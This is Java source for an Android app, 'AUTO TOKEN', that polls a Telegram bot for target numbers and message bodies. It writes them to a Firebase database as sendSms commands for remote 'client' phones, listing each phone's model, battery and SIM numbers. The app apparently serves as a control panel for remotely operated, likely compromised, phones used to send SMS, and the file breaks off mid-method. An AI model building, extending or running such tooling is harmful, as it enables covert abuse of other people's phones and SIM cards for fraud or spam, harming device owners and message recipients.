package com.autotoken.app;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends Activity {

    // ==========================================
    // STATE VARIABLES  (1:1 with script.js)
    // ==========================================
    private List<ChatId> chatIds = new ArrayList<>();
    private List<FirebaseUrl> firebaseUrls = new ArrayList<>();
    private String savedToken = "";
    private boolean isRunning = false;
    private long lastUpdateId = 0;

    // Current extracted data (Telegram)
    private String currentTargetNumber = "";
    private String currentMessageBody = "";

    // Firebase Search
    private List<Device> allDevices = new ArrayList<>();
    private boolean hasFetched = false;
    private String selectedDeviceId = null;
    private String selectedSimIndex = "0"; // 0 for SIM 1, 1 for SIM 2

    // Network Speed Test
    private boolean isTestingSpeed = false;

    // Infra
    private SharedPreferences prefs;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newCachedThreadPool();
    private final Runnable speedRunnable = new Runnable() {
        @Override public void run() {
            updateNetworkSpeed();
            mainHandler.postDelayed(this, 2000);
        }
    };

    // Views
    private TextView pageTitle, pingStatus, resultText, tokenStatus;
    private FrameLayout backBtn;
    private View homePage, searchPage, settingsPage;
    private ScrollView terminalScroll;
    private LinearLayout terminalOutput, chatIdList, firebaseUrlList, deviceList;
    private Button startStopBtn;
    private EditText telegramToken, chatIdInput, chatNickInput, firebaseUrlInput, firebaseNickInput, searchInput;
    private LinearLayout navHome, navSearch, navSettings;
    private ImageView navHomeIcon, navSearchIcon, navSettingsIcon;
    private TextView navHomeText, navSearchText, navSettingsText;

    // Data classes
    static class ChatId {
        String id; String nickname; boolean isDefault;
        ChatId(String id, String nickname, boolean isDefault){ this.id=id; this.nickname=nickname; this.isDefault=isDefault; }
    }
    static class FirebaseUrl {
        String url; String nickname; boolean isDefault;
        FirebaseUrl(String url, String nickname, boolean isDefault){ this.url=url; this.nickname=nickname; this.isDefault=isDefault; }
    }
    static class Device {
        String id, model, battery, sim1, sim2;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("autotoken", Context.MODE_PRIVATE);

        bindViews();
        wireEvents();

        // INIT APP (same order as script.js bottom)
        loadData();
        switchPage("homePage");

        // Speed test every 2s + immediately (same as script.js)
        updateNetworkSpeed();
        mainHandler.postDelayed(speedRunnable, 2000);
    }

    private void bindViews() {
        pageTitle = findViewById(R.id.pageTitle);
        pingStatus = findViewById(R.id.pingStatus);
        backBtn = findViewById(R.id.backBtn);
        homePage = findViewById(R.id.homePage);
        searchPage = findViewById(R.id.searchPage);
        settingsPage = findViewById(R.id.settingsPage);
        terminalScroll = findViewById(R.id.terminalScroll);
        terminalOutput = findViewById(R.id.terminalOutput);
        startStopBtn = findViewById(R.id.startStopBtn);

        telegramToken = findViewById(R.id.telegramToken);
        tokenStatus = findViewById(R.id.tokenStatus);
        chatIdInput = findViewById(R.id.chatIdInput);
        chatNickInput = findViewById(R.id.chatNickInput);
        chatIdList = findViewById(R.id.chatIdList);
        firebaseUrlInput = findViewById(R.id.firebaseUrlInput);
        firebaseNickInput = findViewById(R.id.firebaseNickInput);
        firebaseUrlList = findViewById(R.id.firebaseUrlList);

        searchInput = findViewById(R.id.searchInput);
        resultText = findViewById(R.id.resultText);
        deviceList = findViewById(R.id.deviceList);

        navHome = findViewById(R.id.navHome);
        navSearch = findViewById(R.id.navSearch);
        navSettings = findViewById(R.id.navSettings);
        navHomeIcon = findViewById(R.id.navHomeIcon);
        navSearchIcon = findViewById(R.id.navSearchIcon);
        navSettingsIcon = findViewById(R.id.navSettingsIcon);
        navHomeText = findViewById(R.id.navHomeText);
        navSearchText = findViewById(R.id.navSearchText);
        navSettingsText = findViewById(R.id.navSettingsText);

        // Initial terminal lines (same as index.html)
        addLog("[SYSTEM] AUTO TOKEN initialized...", "info");
        addLog("[SYSTEM] Press START to begin.", "info");
    }

    private void wireEvents() {
        backBtn.setOnClickListener(v -> goBack());
        startStopBtn.setOnClickListener(v -> toggleStart());

        findViewById(R.id.setTokenBtn).setOnClickListener(v -> saveToken());
        findViewById(R.id.addChatBtn).setOnClickListener(v -> addChatId());
        findViewById(R.id.addFirebaseBtn).setOnClickListener(v -> addFirebaseUrl());
        findViewById(R.id.saveAllBtn).setOnClickListener(v -> saveSettings());

        findViewById(R.id.searchBtn).setOnClickListener(v -> searchDevices());
        findViewById(R.id.refreshBtn).setOnClickListener(v -> fetchAllDevices(true));

        // oninput="searchDevices()"
        searchInput.addTextChangedListener(new android.text.TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int a, int b, int c) {}
            @Override public void onTextChanged(CharSequence s, int a, int b, int c) { searchDevices(); }
            @Override public void afterTextChanged(android.text.Editable s) {}
        });
        searchInput.setOnEditorActionListener((v, actionId, event) -> {
            if (actionId == EditorInfo.IME_ACTION_SEARCH) { searchDevices(); return true; }
            return false;
        });

        navHome.setOnClickListener(v -> switchPage("homePage"));
        navSearch.setOnClickListener(v -> switchPage("searchPage"));
        navSettings.setOnClickListener(v -> switchPage("settingsPage"));
    }

    // ==========================================
    // REAL LIVE NETWORK SPEED TEST (D & U)
    // ==========================================
    private void updateNetworkSpeed() {
        if (isTestingSpeed) return; // Agar pichla test chal raha hai toh naya mat shuru karo
        if (pingStatus == null) return;

        isTestingSpeed = true;
        pingStatus.setText("Testing...");
        pingStatus.setTextColor(Color.parseColor("#ffffff"));

        executor.submit(() -> {
            double dlMbps = 0;
            double ulMbps = 0;

            // 1. DOWNLOAD TEST (10 KB)
            try {
                long startDl = System.nanoTime();
                HttpURLConnection c = (HttpURLConnection) new URL("https://speed.cloudflare.com/__down?bytes=10000").openConnection();
                c.setUseCaches(false);
                c.setConnectTimeout(8000);
                c.setReadTimeout(8000);
                InputStream is = c.getInputStream();
                byte[] buf = new byte[4096];
                while (is.read(buf) != -1) { /* drain */ }
                is.close();
                c.disconnect();
                double timeDl = (System.nanoTime() - startDl) / 1e9;
                if (timeDl > 0) dlMbps = (10000.0 * 8) / timeDl / 1000000.0;
            } catch (Exception e) { dlMbps = 0; }

            // 2. UPLOAD TEST (5 KB)
            try {
                byte[] dummyData = new byte[5000];
                long startUl = System.nanoTime();
                HttpURLConnection c = (HttpURLConnection) new URL("https://speed.cloudflare.com/__up").openConnection();
                c.setUseCaches(false);
                c.setDoOutput(true);
                c.setRequestMethod("POST");
                c.setConnectTimeout(8000);
                c.setReadTimeout(8000);
                OutputStream os = c.getOutputStream();
                os.write(dummyData);
                os.flush();
                os.close();
                int code = c.getResponseCode();
                try { InputStream is = c.getInputStream(); byte[] b = new byte[2048]; while (is.read(b) != -1) {} is.close(); } catch (Exception ignore) {}
                c.disconnect();
                double timeUl = (System.nanoTime() - startUl) / 1e9;
                if (timeUl > 0 && code > 0) ulMbps = (5000.0 * 8) / timeUl / 1000000.0;
            } catch (Exception e) { ulMbps = 0; }

            final double fdl = dlMbps;
            final double ful = ulMbps;
            mainHandler.post(() -> applySpeedResult(fdl, ful));
        });
    }

    private void applySpeedResult(double dlMbps, double ulMbps) {
        // 3. FORMATTING  (exact same as script.js)
        String dText = dlMbps > 1 ? String.format("%.1f", dlMbps) + "M" : Math.round(dlMbps * 1000) + "K";
        String uText = ulMbps > 1 ? String.format("%.1f", ulMbps) + "M" : Math.round(ulMbps * 1000) + "K";

        // Agar internet nahi hai
        if (dlMbps == 0 && ulMbps == 0) {
            pingStatus.setText("OFFLINE");
            pingStatus.setTextColor(Color.parseColor("#ff3333"));
            isTestingSpeed = false;
            return;
        }

        pingStatus.setText("D:" + dText + " U:" + uText);

        // Color based on speed
        if (dlMbps > 1) pingStatus.setTextColor(Color.parseColor("#4caf50"));
        else if (dlMbps > 0.2) pingStatus.setTextColor(Color.parseColor("#ffc107"));
        else pingStatus.setTextColor(Color.parseColor("#ff3333"));

        isTestingSpeed = false; // Lock khol diya
    }

    // ==========================================
    // STORAGE & NAVIGATION
    // ==========================================
    private void loadData() {
        savedToken = prefs.getString("telegramToken", "");
        String sc = prefs.getString("chatIds", null);
        String sf = prefs.getString("firebaseUrls", null);
        try {
            if (sc != null) {
                chatIds.clear();
                JSONArray arr = new JSONArray(sc);
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject o = arr.getJSONObject(i);
                    chatIds.add(new ChatId(o.optString("id"), o.optString("nickname"), o.optBoolean("isDefault")));
                }
            }
        } catch (Exception ignore) {}
        try {
            if (sf != null) {
                firebaseUrls.clear();
                JSONArray arr = new JSONArray(sf);
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject o = arr.getJSONObject(i);
                    firebaseUrls.add(new FirebaseUrl(o.optString("url"), o.optString("nickname"), o.optBoolean("isDefault")));
                }
            }
        } catch (Exception ignore) {}

        if (!TextUtils.isEmpty(savedToken)) {
            telegramToken.setText(savedToken);
            tokenStatus.setVisibility(View.VISIBLE);
        }
        renderChatIds();
        renderFirebaseUrls();
    }

    private void saveToStorage() {
        try {
            JSONArray ca = new JSONArray();
            for (ChatId c : chatIds) {
                JSONObject o = new JSONObject();
                o.put("id", c.id); o.put("nickname", c.nickname); o.put("isDefault", c.isDefault);
                ca.put(o);
            }
            JSONArray fa = new JSONArray();
            for (FirebaseUrl f : firebaseUrls) {
                JSONObject o = new JSONObject();
                o.put("url", f.url); o.put("nickname", f.nickname); o.put("isDefault", f.isDefault);
                fa.put(o);
            }
            prefs.edit()
                .putString("chatIds", ca.toString())
                .putString("firebaseUrls", fa.toString())
                .putString("telegramToken", savedToken)
                .apply();
        } catch (Exception ignore) {}
    }

    private void switchPage(String pageId) {
        homePage.setVisibility("homePage".equals(pageId) ? View.VISIBLE : View.GONE);
        searchPage.setVisibility("searchPage".equals(pageId) ? View.VISIBLE : View.GONE);
        settingsPage.setVisibility("settingsPage".equals(pageId) ? View.VISIBLE : View.GONE);

        if ("homePage".equals(pageId)) pageTitle.setText("AUTO TOKEN");
        else if ("searchPage".equals(pageId)) pageTitle.setText("DEVICE");
        else if ("settingsPage".equals(pageId)) pageTitle.setText("SETTINGS");

        if ("homePage".equals(pageId)) backBtn.setVisibility(View.INVISIBLE);
        else backBtn.setVisibility(View.VISIBLE);

        // nav active states
        int active = Color.parseColor("#e84e1b");
        int inactive = Color.parseColor("#666666");
        navHomeText.setTextColor("homePage".equals(pageId) ? active : inactive);
        navSearchText.setTextColor("searchPage".equals(pageId) ? active : inactive);
        navSettingsText.setTextColor("settingsPage".equals(pageId) ? active : inactive);
        navHomeIcon.setColorFilter("homePage".equals(pageId) ? active : inactive);
        navSearchIcon.setColorFilter("searchPage".equals(pageId) ? active : inactive);
        navSettingsIcon.setColorFilter("settingsPage".equals(pageId) ? active : inactive);

        // Auto-fetch devices when Search tab is opened
        if ("searchPage".equals(pageId) && !hasFetched) {
            fetchAllDevices(false);
        }
    }

    private void goBack() { switchPage("homePage"); }

    private void addLog(String msg, String type) {
        TextView tv = new TextView(this);
        tv.setText(msg);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        tv.setTypeface(android.graphics.Typeface.MONOSPACE);
        int color;
        switch (type) {
            case "info": color = Color.parseColor("#00bcd4"); break;
            case "warn": color = Color.parseColor("#ffc107"); break;
            case "err": color = Color.parseColor("#ff3333"); break;
            case "success": color = Color.parseColor("#4caf50"); break;
            default: color = Color.parseColor("#00ff00"); break;
        }
        tv.setTextColor(color);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = dp(5);
        tv.setLayoutParams(lp);
        terminalOutput.addView(tv);
        terminalScroll.post(() -> terminalScroll.fullScroll(View.FOCUS_DOWN));
    }

    // ==========================================
    // SETTINGS LOGIC
    // ==========================================
    private void saveToken() {
        String token = telegramToken.getText().toString().trim();
        if (!token.isEmpty()) {
            savedToken = token;
            prefs.edit().putString("telegramToken", savedToken).apply();
            tokenStatus.setVisibility(View.VISIBLE);
            alert("Telegram Bot Token Saved!");
        } else {
            alert("Please enter a token.");
        }
    }

    private void addChatId() {
        String id = chatIdInput.getText().toString().trim();
        String nick = chatNickInput.getText().toString().trim();
        if (nick.isEmpty()) nick = "No Nickname";
        if (!id.isEmpty()) {
            chatIds.add(new ChatId(id, nick, chatIds.size() == 0));
            renderChatIds();
            chatIdInput.setText("");
            chatNickInput.setText("");
            saveToStorage();
        }
    }

    private void renderChatIds() {
        chatIdList.removeAllViews();
        for (int i = 0; i < chatIds.size(); i++) {
            final int index = i;
            ChatId item = chatIds.get(i);
            chatIdList.addView(buildListItem(item.nickname, item.id, item.isDefault,
                    () -> setDefaultChat(index), () -> removeChat(index)));
        }
    }

    private void setDefaultChat(int index) {
        for (int i = 0; i < chatIds.size(); i++) chatIds.get(i).isDefault = (i == index);
        renderChatIds();
        saveToStorage();
    }

    private void removeChat(int index) {
        chatIds.remove(index);
        if (chatIds.size() > 0) {
            boolean any = false;
            for (ChatId c : chatIds) if (c.isDefault) { any = true; break; }
            if (!any) chatIds.get(0).isDefault = true;
        }
        renderChatIds();
        saveToStorage();
    }

    private void addFirebaseUrl() {
        String url = firebaseUrlInput.getText().toString().trim();
        String nick = firebaseNickInput.getText().toString().trim();
        if (nick.isEmpty()) nick = "No Nickname";
        if (!url.isEmpty()) {
            firebaseUrls.add(new FirebaseUrl(url, nick, firebaseUrls.size() == 0));
            renderFirebaseUrls();
            firebaseUrlInput.setText("");
            firebaseNickInput.setText("");
            saveToStorage();
        }
    }

    private void renderFirebaseUrls() {
        firebaseUrlList.removeAllViews();
        for (int i = 0; i < firebaseUrls.size(); i++) {
            final int index = i;
            FirebaseUrl item = firebaseUrls.get(i);
            firebaseUrlList.addView(buildListItem(item.nickname, item.url, item.isDefault,
                    () -> setDefaultFirebase(index), () -> removeFirebase(index)));
        }
    }

    private void setDefaultFirebase(int index) {
        for (int i = 0; i < firebaseUrls.size(); i++) firebaseUrls.get(i).isDefault = (i == index);
        renderFirebaseUrls();
        saveToStorage();
    }

    private void removeFirebase(int index) {
        firebaseUrls.remove(index);
        if (firebaseUrls.size() > 0) {
            boolean any = false;
            for (FirebaseUrl f : firebaseUrls) if (f.isDefault) { any = true; break; }
            if (!any) firebaseUrls.get(0).isDefault = true;
        }
        renderFirebaseUrls();
        saveToStorage();
    }

    private void saveSettings() {
        saveToStorage();
        alert("All Settings Saved!");
    }

    // Builds a settings list row (nickname + value + Default + X)  -> same markup as script.js li
    private View buildListItem(String nick, String val, boolean isDefault,
                               final Runnable onDefault, final Runnable onRemove) {
        LinearLayout li = new LinearLayout(this);
        li.setOrientation(LinearLayout.HORIZONTAL);
        li.setGravity(Gravity.CENTER_VERTICAL);
        li.setBackgroundResource(R.drawable.bg_list_item);
        li.setPadding(dp(10), dp(10), dp(10), dp(10));
        LinearLayout.LayoutParams liLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        liLp.bottomMargin = dp(6);
        li.setLayoutParams(liLp);

        LinearLayout left = new LinearLayout(this);
        left.setOrientation(LinearLayout.VERTICAL);
        left.setLayoutParams(new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        TextView nickTv = new TextView(this);
        nickTv.setText(nick);
        nickTv.setTextColor(Color.parseColor("#ffc107"));
        nickTv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        nickTv.setTypeface(null, android.graphics.Typeface.BOLD);

        TextView valTv = new TextView(this);
        valTv.setText(val);
        valTv.setTextColor(Color.parseColor("#aaaaaa"));
        valTv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);

        left.addView(nickTv);
        left.addView(valTv);

        Button defBtn = new Button(this);
        defBtn.setText("Default");
        defBtn.setAllCaps(false);
        defBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
        defBtn.setTypeface(null, android.graphics.Typeface.BOLD);
        defBtn.setTextColor(isDefault ? Color.parseColor("#ffffff") : Color.parseColor("#aaaaaa"));
        defBtn.setBackgroundResource(isDefault ? R.drawable.btn_default_active : R.drawable.btn_default);
        defBtn.setMinWidth(0); defBtn.setMinimumWidth(0);
        defBtn.setPadding(dp(8), dp(5), dp(8), dp(5));
        try { defBtn.setStateListAnimator(null); } catch (Exception ignore) {}
        LinearLayout.LayoutParams defLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        defLp.leftMargin = dp(4);
        defBtn.setLayoutParams(defLp);
        defBtn.setOnClickListener(v -> onDefault.run());

        Button rmBtn = new Button(this);
        rmBtn.setText("X");
        rmBtn.setAllCaps(false);
        rmBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
        rmBtn.setTypeface(null, android.graphics.Typeface.BOLD);
        rmBtn.setTextColor(Color.parseColor("#ffffff"));
        rmBtn.setBackgroundResource(R.drawable.btn_remove);
        rmBtn.setMinWidth(0); rmBtn.setMinimumWidth(0);
        rmBtn.setPadding(dp(8), dp(5), dp(8), dp(5));
        try { rmBtn.setStateListAnimator(null); } catch (Exception ignore) {}
        LinearLayout.LayoutParams rmLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rmLp.leftMargin = dp(4);
        rmBtn.setLayoutParams(rmLp);
        rmBtn.setOnClickListener(v -> onRemove.run());

        li.addView(left);
        li.addView(defBtn);
        li.addView(rmBtn);
        return li;
    }

    // ==========================================
    // TELEGRAM LOGIC (Polling & Extraction)
    // ==========================================
    private String[] extractData(String rawText) {
        String target = null;
        String content = null;
        Matcher toM = Pattern.compile("To\\s*(?:\\(Tap to copy\\))?\\s*:\\s*([+\\d]+)",
                Pattern.CASE_INSENSITIVE).matcher(rawText);
        if (toM.find()) target = toM.group(1).trim();

        Matcher bodyM = Pattern.compile("Body\\s*(?:\\(Tap to copy\\))?\\s*:\\s*([\\s\\S]+)",
                Pattern.CASE_INSENSITIVE).matcher(rawText);
        if (bodyM.find()) content = bodyM.group(1).trim();

        return new String[]{ target, content };
    }

    private void toggleStart() {
        ChatId ac = defaultChat();

        if (!isRunning) {
            if (TextUtils.isEmpty(savedToken) || ac == null) {
                alert("Bhai pehle Settings me Bot Token aur Default Chat ID set karo!");
                return;
            }
            if (selectedDeviceId == null) {
                alert("Bhai pehle Search tab me jaakar koi Device SET karo!");
                return;
            }

            isRunning = true;
            startStopBtn.setText("STOP");
            startStopBtn.setBackgroundResource(R.drawable.btn_stop);

            addLog("[SYSTEM] Starting Telegram Polling...", "info");
            addLog("[TELEGRAM] Using Chat: " + ac.nickname, "info");

            startTelegramPolling(ac.id);
        } else {
            isRunning = false;
            startStopBtn.setText("START");
            startStopBtn.setBackgroundResource(R.drawable.btn_start);
            addLog("[SYSTEM] Bot Stopped.", "warn");
        }
    }

    private void startTelegramPolling(final String chatId) {
        if (!isRunning) return;

        executor.submit(() -> {
            try {
                String url = "https://api.telegram.org/bot" + savedToken +
                        "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=15";
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setConnectTimeout(10000);
                c.setReadTimeout(20000);
                String resp = readBody(c);
                c.disconnect();

                final JSONObject data = new JSONObject(resp);
                mainHandler.post(() -> {
                    try {
                        handleTelegramResponse(data, chatId);
                    } catch (Exception e) {
                        addLog("[NETWORK ERR] Retrying...", "warn");
                        if (isRunning) mainHandler.postDelayed(() -> startTelegramPolling(chatId), 1000);
                    }
                });
            } catch (Exception e) {
                mainHandler.post(() -> {
                    addLog("[NETWORK ERR] Retrying...", "warn");
                    if (isRunning) mainHandler.postDelayed(() -> startTelegramPolling(chatId), 1000);
                });
            }
        });
    }

    private void handleTelegramResponse(JSONObject data, String chatId) throws Exception {
        if (data.optBoolean("ok", false)) {
            JSONArray result = data.optJSONArray("result");
            if (result != null && result.length() > 0) {
                for (int i = 0; i < result.length(); i++) {
                    JSONObject update = result.getJSONObject(i);
                    lastUpdateId = update.optLong("update_id", lastUpdateId);

                    JSONObject post = update.optJSONObject("channel_post");
                    if (post == null) post = update.optJSONObject("message");
                    if (post == null) continue;

                    JSONObject chat = post.optJSONObject("chat");
                    String postChatId = chat != null ? String.valueOf(chat.opt("id")) : "";
                    if (!postChatId.equals(String.valueOf(chatId))) continue;

                    String text = post.optString("text", "");
                    if (TextUtils.isEmpty(text)) text = post.optString("caption", "");
                    if (TextUtils.isEmpty(text)) continue;

                    String[] parsed = extractData(text);
                    String target = parsed[0];
                    String content = parsed[1];

                    if (target != null && content != null) {
                        currentTargetNumber = target;
                        currentMessageBody = content;

                        addLog("[TELEGRAM] New Msg Detected:", "success");
                        addLog("To: " + currentTargetNumber, "info");
                        addLog("Body: " + currentMessageBody, "info");

                        pushToFirebase();
                    } else {
                        addLog("[TELEGRAM] Ignored (Format not matched)", "warn");
                    }
                }
            }
        } else {
            String desc = data.optString("description", "Unknown Error");
            addLog("[TELEGRAM ERR] " + desc, "err");
            isRunning = false;
            startStopBtn.setText("START");
            startStopBtn.setBackgroundResource(R.drawable.btn_start);
            return;
        }

        if (isRunning) {
            mainHandler.postDelayed(() -> startTelegramPolling(chatId), 1000);
        }
    }

    // ==========================================
    // FIREBASE PUSH LOGIC
    // ==========================================
    private void pushToFirebase() {
        final FirebaseUrl af = defaultFirebase();
        if (af == null) {
            addLog("[FIREBASE ERR] Default Firebase URL not set!", "err");
            return;
        }

        final String url = af.url + "/clients/" + selectedDeviceId + "/webhookEvent/sendSms.json";

        final JSONObject payload = new JSONObject();
        try {
            payload.put("from", selectedSimIndex);     // "0" for SIM 1, "1" for SIM 2
            payload.put("to", currentTargetNumber);     // Exact number from Telegram
            payload.put("message", currentMessageBody);  // Exact message from Telegram
            payload.put("isSended", false);              // Always false
        } catch (Exception ignore) {}

        executor.submit(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("PUT");
                c.setRequestProperty("Content-Type", "application/json");
                c.setDoOutput(true);
                c.setConnectTimeout(10000);
                c.setReadTimeout(15000);
                OutputStream os = c.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();
                final int code = c.getResponseCode();
                try { InputStream is = c.getInputStream(); byte[] b = new byte[2048]; while (is.read(b) != -1) {} is.close(); } catch (Exception ignore) {}
                c.disconnect();

                mainHandler.post(() -> {
                    if (code >= 200 && code < 300) {
                        addLog("[FIREBASE] ✅ SMS Queued successfully!", "success");
                    } else {
                        addLog("[FIREBASE ERR] ❌ Failed (HTTP " + code + ")", "err");
                    }
                });
            } catch (Exception e) {
                mainHandler.post(() -> addLog("[FIREBASE ERR] ❌ Network Problem", "err"));
            }
        });
    }

    // ==========================================
    // FIREBASE SEARCH & FETCH LOGIC
    // ==========================================
    private void fetchAllDevices(boolean forceRefresh) {
        if (hasFetched && !forceRefresh) return;

        final FirebaseUrl af = defaultFirebase();
        if (af == null) { alert("Bhai pehle Settings me Firebase URL set karo!"); return; }

        deviceList.removeAllViews();
        TextView loading = new TextView(this);
        loading.setText("Fetching devices from Firebase...");
        loading.setTextColor(Color.parseColor("#ffffff"));
        loading.setGravity(Gravity.CENTER);
        deviceList.addView(loading);
        resultText.setText("Result: ...");

        executor.submit(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(af.url + "/clients.json").openConnection();
                c.setConnectTimeout(10000);
                c.setReadTimeout(15000);
                String resp = readBody(c);
                c.disconnect();

                final List<Device> devices = new ArrayList<>();
                if (resp != null && !resp.equals("null") && !resp.trim().isEmpty()) {
                    JSONObject data = new JSONObject(resp);
                    java.util.Iterator<String> keys = data.keys();
                    while (keys.hasNext()) {
                        String id = keys.next();
                        JSONObject info = data.optJSONObject(id);
                        if (info == null) info = new JSONObject();
                        Device d = new Device();
                        d.id = id;
                        d.model = info.optString("modelName", "Unknown Model");
                        if (TextUtils.isEmpty(d.model)) d.model = "Unknown Model";
                        d.battery = info.has("battery") && !info.isNull("battery") ? info.optString("battery", "N/A") : "N/A";
                        if (TextUtils.isEmpty(d.battery)) d.battery = "N/A";

                        String sim1 = "No SIM", sim2 = "No SIM";
                        JSONArray sims = info.optJSONArray("sims");
                        if (sims != null) {
                            JSONObject s0 = sims.optJSONObject(0);
                            if (s0 != null) {
                                String p = s0.optString("phoneNumber", "");
                                if (!TextUtils.isEmpty(p) && !p.equals("null")) sim1 = p;
                            }
                            JSONObject s1 = sims.optJSONObject(1);
                            if (s1 != null) {
                                String p = s1.optString("phoneNumber", "");
                                if (!TextUtils.isEmpty(p) && !p.equals("null")) sim2 = p;
                            }
                        }
                        d.sim1 = sim1;
                        d.sim2 = sim2;
                        devices.add(d);
                    }
                }

                mainHandler.post(() -> {
                    allDevices = devices;
                    hasFetched = true;
                    renderDevices(allDevices);
                });
            } catch (Exception e) {
                mainHandler.post(() -> {
                    deviceList.removeAllViews();
                    TextView err = new TextView(this);
                    err.setText("Error fetching data. Check Firebase URL.");
                    err.setTextColor(Color.parseColor("#ff3333"));
                    err.setGravity(Gravity.CENTER);
                    deviceList.addView(err);
                });
            }
        });
    }

    private void searchDevices() {
        String query = searchInput.getText().toString().trim().toUpperCase();
        if (query.isEmpty()) {
            renderDevices(allDevices);
            return;
        }
        List<Device> filtered = new ArrayList<>();
        for (Device d : allDevices) {
            if (d.model.toUpperCase().contains(query)) filtered.add(d);
        }
        renderDevices(filtered);
    }

    private void renderDevices(List<Device> devices) {
        deviceList.removeAllViews();
        resultText.setText("Result: " + devices.size());

        if (devices.isEmpty()) {
            TextView none = new TextView(this);
            none.setText("No devices found.");
            none.setTextColor(Color.parseColor("#aaaaaa"));
            none.setGravity(Gravity.CENTER);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            lp.topMargin = dp(20);
            none.setLayoutParams(lp);
            deviceList.addView(none);
            return;
        }

        for (final Device d : devices) {
            deviceList.addView(buildDeviceCard(d));
        }
    }

    private View buildDeviceCard(final Device d) {
        boolean isSelected = d.id.equals(selectedDeviceId);
        boolean checkSim0 = (isSelected && selectedSimIndex.equals("0")) || !isSelected;
        boolean checkSim1 = isSelected && selectedSimIndex.equals("1");

        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackgroundResource(R.drawable.bg_device_card);
        card.setPadding(dp(15), dp(15), dp(15), dp(15));
        LinearLayout.LayoutParams cardLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cardLp.bottomMargin = dp(15);
        card.setLayoutParams(cardLp);

        card.addView(infoRow("MODEL", d.model, "#e84e1b"));
        card.addView(infoRow("ID", d.id, "#00bcd4"));
        card.addView(infoRow("BATTERY", d.battery, "#ffc107"));

        // SIM select
        LinearLayout simBox = new LinearLayout(this);
        simBox.setOrientation(LinearLayout.HORIZONTAL);
        simBox.setBackgroundResource(R.drawable.bg_sim_select);
        simBox.setPadding(dp(10), dp(8), dp(10), dp(8));
        LinearLayout.LayoutParams simLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        simLp.topMargin = dp(10);
        simLp.bottomMargin = dp(5);
        simBox.setLayoutParams(simLp);

        final RadioGroup rg = new RadioGroup(this);
        rg.setOrientation(RadioGroup.HORIZONTAL);

        final RadioButton rb0 = new RadioButton(this);
        rb0.setId(View.generateViewId());
        rb0.setText("SIM 1 (" + d.sim1 + ")");
        rb0.setTextColor(Color.parseColor("#cccccc"));
        rb0.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        rb0.setButtonTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#e84e1b")));
        rb0.setTag("0");

        final RadioButton rb1 = new RadioButton(this);
        rb1.setId(View.generateViewId());
        rb1.setText("SIM 2 (" + d.sim2 + ")");
        rb1.setTextColor(Color.parseColor("#cccccc"));
        rb1.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        rb1.setButtonTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#e84e1b")));
        rb1.setTag("1");
        LinearLayout.LayoutParams rb1Lp = new RadioGroup.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rb1Lp.leftMargin = dp(15);
        rb1.setLayoutParams(rb1Lp);

        rg.addView(rb0);
        rg.addView(rb1);
        if (checkSim1) rb1.setChecked(true);
        else if (checkSim0) rb0.setChecked(true);
        simBox.addView(rg);
        card.addView(simBox);

        Button setBtn = new Button(this);
        setBtn.setText("SET");
        setBtn.setTextColor(Color.parseColor("#ffffff"));
        setBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
